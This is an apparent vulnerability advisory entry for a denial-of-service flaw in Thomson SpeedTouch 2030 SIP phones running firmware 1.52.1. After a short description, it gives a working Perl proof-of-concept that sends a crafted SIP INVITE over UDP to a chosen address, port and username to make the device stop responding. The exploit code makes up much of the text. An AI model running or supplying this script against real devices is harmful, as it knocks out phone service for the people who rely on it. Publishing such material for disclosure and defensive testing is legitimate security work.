source: http://www.securityfocus.com/bid/25446/info

Thomson SpeedTouch 2030 is prone to a denial-of-service vulnerability because the device fails to handle specially crafted SIP INVITE messages.

Exploiting this issue allows remote attackers to cause the device to stop responding, thus denying service to legitimate users.

This issue affects Thomas SpeedTouch 2030 firmware 1.52.1; other versions may also be affected. 

!/usr/bin/perl

#Vulnerability for Thomson 2030 firmware v1.52.1

#It provokes a DoS in the device. 

 

use IO::Socket::INET;

die "Usage $0 <dst> <port> <username>" unless ($ARGV[2]);

 

$socket=new IO::Socket::INET->new(PeerPort=>$ARGV[1],

        Proto=>'udp',

        PeerAddr=>$ARGV[0]);

 

$msg = "INVITE sip:$ARGV[2]\@$ARGV[0] SIP/2.0\r\nVia:
SIP/2.0/UDP\\192.168.1.2;branch=00\r\nFrom: Caripe
<sip:caripe\@192.168.1.2>;tag=00\r\nTo:
<sip:$ARGV[2]\@$ARGV[0]>;tag=00\r\nCall-ID: caripe\@192.168.1.2\r\nCSeq: 2
INVITE\r\n\r\n";

$socket->send($msg);